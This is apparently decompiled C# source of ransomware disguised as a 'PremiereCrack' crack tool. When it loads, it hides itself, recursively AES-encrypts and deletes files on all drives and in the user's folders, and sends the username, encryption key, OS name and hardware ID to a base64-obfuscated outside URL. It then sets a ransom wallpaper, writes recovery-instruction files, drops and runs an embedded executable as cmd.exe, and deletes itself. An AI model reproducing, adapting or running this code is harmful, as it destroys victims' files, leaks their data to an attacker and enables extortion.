using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;

namespace PremiereCrack;

[DesignerGenerated]
public class Form1 : Form
{
	private enum Enum0
	{
		const_0 = 1,
		const_1
	}

	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("TextBox2")]
	private TextBox textBox_1;

	private object object_0;

	private byte[] byte_0;

	private byte[] byte_1;

	private byte[] byte_2;

	private byte[] byte_3;

	private byte[] byte_4;

	public string TargetKey;

	public int count;

	public string Extentsion;

	private string string_0;

	private Random random_0;

	private static int int_0;

	private static int int_1;

	private static int int_2;

	public FileStream fsInput;

	public FileStream fsOutput;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		object_0 = "C:\\\\Users\\\\";
		byte_0 = Convert.FromBase64String("QzpcVXNlcnNc");
		byte_1 = Convert.FromBase64String("aHR0cDovL2FyaXpvbmFjb2RlLmJwbGFjZWQubmV0L3Juc20vYWRkLnBocD90eXBlPWFkZCZkYXRhPUluZmluaXR5Q3J5cHR8");
		byte_2 = Convert.FromBase64String("SW5maW5pdHlMb2Nr");
		byte_3 = Convert.FromBase64String("X1JlY292ZXJfSW5zdHJ1Y3Rpb25zLnR4dA==");
		byte_4 = Convert.FromBase64String("X1JlY292ZXJfSW5zdHJ1Y3Rpb25zLnBuZw==");
		Extentsion = "." + GenerateHWID();
		string_0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		random_0 = new Random();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_1)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_1)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		vmethod_1(new TextBox());
		vmethod_3(new TextBox());
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(vmethod_0(), "TextBox1");
		((Control)vmethod_0()).set_Name("TextBox1");
		componentResourceManager.ApplyResources(vmethod_2(), "TextBox2");
		((Control)vmethod_2()).set_Name("TextBox2");
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(TextBox textBox_2)
	{
		textBox_0 = textBox_2;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_2()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(TextBox textBox_2)
	{
		textBox_1 = textBox_2;
	}

	private void method_0(string string_1)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
		checked
		{
			try
			{
				FileInfo[] files = directoryInfo.GetFiles("*.*");
				int num = files.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					FileInfo fileInfo = files[num2];
					if (!(fileInfo.FullName.EndsWith(Extentsion) | fileInfo.FullName.EndsWith(".lnk") | (Operators.CompareString(fileInfo.FullName, Assembly.GetEntryAssembly()!.Location, false) == 0) | fileInfo.FullName.EndsWith("desktop.ini")))
					{
						byte[] byte_ = CreateKey(TargetKey);
						byte[] byte_2 = method_1(TargetKey);
						method_2(fileInfo.FullName, fileInfo.FullName + Extentsion, byte_, byte_2, Enum0.const_0);
						if (File.Exists(fileInfo.FullName))
						{
							File.Delete(fileInfo.FullName);
						}
						count++;
					}
					num2++;
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				int num5 = directories.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					int num4 = num5;
					if (num7 <= num4)
					{
						DirectoryInfo directoryInfo2 = directories[num6];
						method_0(directoryInfo2.FullName);
						num6++;
						continue;
					}
					break;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		string text = "";
		int num = 0;
		int num2;
		int num3;
		do
		{
			if (!(num == 5 || num == 10 || num == 15 || num == 20 || num == 25 || num == 30))
			{
				int index = random_0.Next(0, 61);
				text += Conversions.ToString(string_0[index]);
			}
			else
			{
				text += "xXx";
			}
			num = checked(num + 1);
			num2 = num;
			num3 = 30;
		}
		while (num2 <= num3);
		TargetKey = text;
		text = null;
		A_Drive();
		B_Drive();
		D_Drive();
		E_Drive();
		F_Drive();
		G_Drive();
		H_Drive();
		I_Drive();
		J_Drive();
		K_Drive();
		L_Drive();
		M_Drive();
		N_Drive();
		O_Drive();
		P_Drive();
		Q_Drive();
		R_Drive();
		S_Drive();
		T_Drive();
		U_Drive();
		V_Drive();
		W_Drive();
		X_Drive();
		Y_Drive();
		Z_Drive();
		Programms();
		ProgrammsX86();
		ProgrammFiles();
		Documents();
		Pictures();
		Videos();
		OneDrive();
		Music();
		Downloads();
		Desktop();
		Delay(1.0);
		POST(Encoding.ASCII.GetString(byte_1) + Environment.UserName + "|" + TargetKey + "|" + ((ServerComputer)Class1.Class0_0).get_Info().get_OSFullName() + "|" + GenerateHWID() + "|" + count);
		setInst();
	}

	public void setInst()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		checked
		{
			try
			{
				val2.Clear(Color.Red);
				val2.set_InterpolationMode((InterpolationMode)7);
				val2.set_SmoothingMode((SmoothingMode)4);
				val2.set_TextRenderingHint((TextRenderingHint)4);
				Font val3 = new Font("Segoe UI", 20f);
				try
				{
					Random random = new Random();
					int num = Screen.get_PrimaryScreen().get_Bounds().Height - 1;
					int num2 = 0;
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 > num4)
						{
							break;
						}
						int num5 = Screen.get_PrimaryScreen().get_Bounds().Width - 1;
						int num6 = 0;
						while (true)
						{
							int num7 = num6;
							num4 = num5;
							if (num7 > num4)
							{
								break;
							}
							switch (random.Next(1, 150))
							{
							case 1:
								val.SetPixel(num6, num2, Color.DarkGray);
								break;
							case 2:
								val.SetPixel(num6, num2, Color.Red);
								break;
							case 3:
								val.SetPixel(num6, num2, Color.Yellow);
								break;
							case 4:
								val.SetPixel(num6, num2, Color.Blue);
								break;
							case 5:
								val.SetPixel(num6, num2, Color.Pink);
								break;
							case 6:
								val.SetPixel(num6, num2, Color.Green);
								break;
							case 7:
								val.SetPixel(num6, num2, Color.Orange);
								break;
							case 8:
								val.SetPixel(num6, num2, Color.Lime);
								break;
							case 9:
								val.SetPixel(num6, num2, Color.LightBlue);
								break;
							default:
								val.SetPixel(num6, num2, Color.DimGray);
								break;
							}
							num6++;
						}
						num2++;
					}
					SolidBrush val4 = new SolidBrush(Color.Red);
					try
					{
						val2.DrawString(vmethod_2().get_Text(), val3, (Brush)(object)val4, (float)((double)Screen.get_PrimaryScreen().get_Bounds().Width / 2.0 - 580.0), 190f);
					}
					finally
					{
						((IDisposable)val4)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			((Image)val).Save(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(byte_2) + Encoding.ASCII.GetString(byte_4), ImageFormat.get_Png());
			string string_ = ((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(byte_2) + Encoding.ASCII.GetString(byte_4);
			SystemParametersInfo(20, 0, ref string_, 3);
			string[] contents = new string[1] { vmethod_0().get_Text() };
			if (!File.Exists(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(byte_2) + Encoding.ASCII.GetString(byte_3)))
			{
				File.WriteAllLines(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(byte_2) + Encoding.ASCII.GetString(byte_3), contents);
				StreamWriter streamWriter = new StreamWriter(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\" + Encoding.ASCII.GetString(byte_2) + "_UniqeID.txt");
				streamWriter.Write("UNIQE-ID = " + GenerateHWID());
				streamWriter.Close();
			}
			if (File.Exists(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe"))
			{
				File.Delete(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe");
			}
			File.WriteAllBytes(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe", Class7.Byte_0);
			Process.Start(((ServerComputer)Class1.Class0_0).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\cmd.exe");
			TargetKey = null;
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe");
			processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 1 > Nul & Del \"" + Application.get_ExecutablePath() + "\"";
			processStartInfo.CreateNoWindow = true;
			processStartInfo.ErrorDialog = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Application.ExitThread();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int SystemParametersInfo(int int_3, int int_4, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_5);

	public void Delay(double dblSecs)
	{
		DateAndTime.get_Now().AddSeconds(1.1574074074074073E-05);
		DateTime t = DateAndTime.get_Now().AddSeconds(1.1574074074074073E-05).AddSeconds(dblSecs);
		while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0)
		{
			Application.DoEvents();
		}
	}

	public string GenerateHWID()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
		string s = Conversions.ToString(Operators.ConcatenateObject((object)Environment.MachineName, registryKey.GetValue("ProcessorNameString")));
		registryKey.Close();
		SHA256CryptoServiceProvider sHA256CryptoServiceProvider = new SHA256CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		bytes = sHA256CryptoServiceProvider.ComputeHash(bytes);
		string text = "";
		byte[] array = bytes;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text.ToUpper();
	}

	public static string POST(string string_1)
	{
		WebClient webClient = new WebClient();
		webClient.Headers.Add("Referer", string_1);
		string text = webClient.DownloadString(string_1);
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1);
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		string text2 = text;
		byte[] bytes = Encoding.UTF8.GetBytes(text2);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		requestStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(requestStream);
		streamReader.ReadToEnd();
		streamReader.Close();
		requestStream.Close();
		httpWebResponse.Close();
		return text2;
	}

	public void Desktop()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
	}

	public void Music()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
	}

	public void Documents()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
	}

	public void Videos()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
	}

	public void Programms()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms));
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.Programs));
	}

	public void ProgrammsX86()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
	}

	public void Contacts()
	{
		method_0(Encoding.ASCII.GetString(byte_0) + Environment.UserName + "\\Contacts\\");
	}

	public void Downloads()
	{
		method_0(Encoding.ASCII.GetString(byte_0) + Environment.UserName + "\\Downloads\\");
	}

	public void UserDirs()
	{
		method_0(Encoding.ASCII.GetString(byte_0) + Environment.UserName);
	}

	public void OneDrive()
	{
		method_0(Encoding.ASCII.GetString(byte_0) + Environment.UserName + "\\OneDrive\\");
	}

	public void ProgrammFiles()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
		method_0(Conversions.ToString(38));
	}

	public void Windows()
	{
		method_0(Conversions.ToString(36));
	}

	public void Pictures()
	{
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		method_0(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
	}

	public void A_Drive()
	{
		method_0("A:\\");
	}

	public void B_Drive()
	{
		method_0("B:\\");
	}

	public void D_Drive()
	{
		method_0("D:\\");
	}

	public void E_Drive()
	{
		method_0("E:\\");
	}

	public void F_Drive()
	{
		method_0("F:\\");
	}

	public void G_Drive()
	{
		method_0("G:\\");
	}

	public void H_Drive()
	{
		method_0("H:\\");
	}

	public void I_Drive()
	{
		method_0("I:\\");
	}

	public void J_Drive()
	{
		method_0("J:\\");
	}

	public void K_Drive()
	{
		method_0("K:\\");
	}

	public void L_Drive()
	{
		method_0("L:\\");
	}

	public void M_Drive()
	{
		method_0("M:\\");
	}

	public void N_Drive()
	{
		method_0("N:\\");
	}

	public void O_Drive()
	{
		method_0("O:\\");
	}

	public void P_Drive()
	{
		method_0("P:\\");
	}

	public void Q_Drive()
	{
		method_0("Q:\\");
	}

	public void R_Drive()
	{
		method_0("R:\\");
	}

	public void S_Drive()
	{
		method_0("S:\\");
	}

	public void T_Drive()
	{
		method_0("T:\\");
	}

	public void U_Drive()
	{
		method_0("U:\\");
	}

	public void V_Drive()
	{
		method_0("V:\\");
	}

	public void W_Drive()
	{
		method_0("W:\\");
	}

	public void X_Drive()
	{
		method_0("X:\\");
	}

	public void Y_Drive()
	{
		method_0("Y:\\");
	}

	public void Z_Drive()
	{
		method_0("Z:\\");
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			int num = 0;
			int num3;
			while (true)
			{
				int num2 = num;
				num3 = upperBound2;
				if (num2 > num3)
				{
					break;
				}
				array2[num] = (byte)Strings.Asc(array[num]);
				num++;
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num4 = 0;
			int num5;
			do
			{
				array4[num4] = array3[num4];
				num4++;
				num5 = num4;
				num3 = 31;
			}
			while (num5 <= num3);
			return array4;
		}
	}

	private byte[] method_1(string string_1)
	{
		char[] array = string_1.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			int num = 0;
			int num3;
			while (true)
			{
				int num2 = num;
				num3 = upperBound2;
				if (num2 > num3)
				{
					break;
				}
				array2[num] = (byte)Strings.Asc(array[num]);
				num++;
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num4 = 32;
			int num5;
			do
			{
				array4[num4 - 32] = array3[num4];
				num4++;
				num5 = num4;
				num3 = 47;
			}
			while (num5 <= num3);
			return array4;
		}
	}

	private void method_2(string string_1, string string_2, byte[] byte_5, byte[] byte_6, Enum0 enum0_0)
	{
		long num = 0L;
		try
		{
			fsInput = new FileStream(string_1, FileMode.Open, FileAccess.Read);
			fsOutput = new FileStream(string_2, FileMode.OpenOrCreate, FileAccess.Write);
			fsOutput.SetLength(0L);
			byte[] buffer = new byte[4097];
			long length = fsInput.Length;
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = default(CryptoStream);
			switch (enum0_0)
			{
			case Enum0.const_0:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(byte_5, byte_6), CryptoStreamMode.Write);
				break;
			case Enum0.const_1:
				cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(byte_5, byte_6), CryptoStreamMode.Write);
				break;
			}
			int num2;
			for (; num < length; num = checked(num + num2))
			{
				num2 = fsInput.Read(buffer, 0, 4096);
				cryptoStream.Write(buffer, 0, num2);
			}
			cryptoStream.Close();
			fsInput.Close();
			fsOutput.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
